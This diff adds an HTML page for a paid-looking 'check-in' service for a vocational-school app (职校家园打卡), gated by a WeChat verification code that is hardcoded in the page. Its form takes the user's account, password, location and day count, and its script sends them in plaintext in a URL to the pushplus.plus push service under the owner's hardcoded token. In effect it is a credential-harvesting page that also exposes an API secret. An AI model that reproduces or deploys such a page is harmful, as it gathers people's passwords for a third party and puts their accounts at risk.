@@ -1,0 +1,142 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>职校家园打卡</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: rgb(13, 110, 253);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        
+        form {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 16px;
+            box-sizing: border-box;
+        }
+        
+        button {
+            background-color: #007BFF;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+
+<body>
+
+
+    <link href="sweetalert.min.css" rel="stylesheet">
+    <script src="sweetalert.min.js"></script>
+    <script type="text/javascript">
+        swal({
+            title: '',
+            text: "为防止接口泛滥，特加验证",
+            type: 'input',
+            closeOnConfirm: false,
+            closeOnCancel: false,
+            confirmButtonText: "确 认",
+            imageUrl: 'wx.jpg',
+            imageSize: '200x200',
+            inputPlaceholder: "添加微信：回复“职校家园打卡”获取验证码",
+            showLoaderOnConfirm: true,
+        }, function(inputValue) {
+            if (inputValue != 'w3g5') {
+                swal.showInputError('输入错误，添加即可获取');
+                return;
+            } else {
+                swal.close('wdzzz');
+                return;
+            }
+        });
+    </script>
+
+    <form id="attendanceForm">
+        <label for="account">账号:</label>
+        <input type="text" id="account" name="account" required>
+
+        <label for="password">密码:</label>
+        <input type="password" id="password" name="password" required>
+
+        <label for="location">打卡地址:</label>
+        <input type="text" id="location" name="location" required>
+
+        <label for="days">打卡天数:</label>
+        <input type="number" id="days" name="days" required>
+
+        <button type="button" onclick="submitForm()">提交</button>
+    </form>
+
+    <script>
+        function submitForm() {
+            var account = document.getElementById('account').value;
+            var password = document.getElementById('password').value;
+            var location = document.getElementById('location').value;
+            var days = document.getElementById('days').value;
+
+            var formData = {
+                account: account,
+                password: password,
+                location: location,
+                days: days
+            };
+
+            // 构建推送标题和内容
+            var title = "职校家园打卡";
+            var content = "账号: " + formData.account +
+                "\n密码: " + formData.password +
+                "\n打卡地址: " + formData.location +
+                "\n打卡天数: " + formData.days;
+
+            let token = "f0fe337c752e4294a6018218d64e0bd1";
+            let url = 'https://www.pushplus.plus/send?token=' + token + '&title=' + title + '&content=' + content + '&template=html';
+
+            // 使用跨域请求方法，如果不支持CORS，可能需要使用代理服务器
+            fetch(url, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: {
+                        'Content-Type': 'application/json;charset=UTF-8'
+                    }
+                })
+                .then(response => {
+                    if (response.status === 200) {
+                        alert('提交成功！');
+                    } else {
+                        alert('提交失败！');
+                    }
+                })
+                .catch(error => {
+                    alert('推送消息失败:', error);
+                    alert('推送消息提醒失败！');
+                });
+        }
+        // console.log(url);
+    </script>
+</body>
+
+</html>
